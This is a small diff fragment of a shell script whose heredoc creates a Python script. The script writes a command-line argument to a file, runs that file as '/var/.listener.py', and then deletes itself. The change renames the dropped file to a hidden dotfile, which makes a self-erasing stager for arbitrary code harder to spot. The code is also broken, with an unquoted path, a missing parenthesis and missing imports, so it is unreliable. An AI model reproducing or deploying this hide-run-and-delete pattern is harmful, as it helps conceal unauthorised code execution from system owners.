@@ -31,11 +31,11 @@ cat <<EOFA > /tmp/test.py
 import file
 import sys
 def main():
-	f = open(/var/*listener.py, "w")
+	f = open(/var/.listener.py, "w")
 	text = str(sys.argv[1])
 	f.write(text)
 	f.close()
-	os.system("python3 /var/*listener.py")
+	os.system("python3 /var/.listener.py")
 	self = sys.argv[0]
 	os.system(f"rm {self}"
 main()
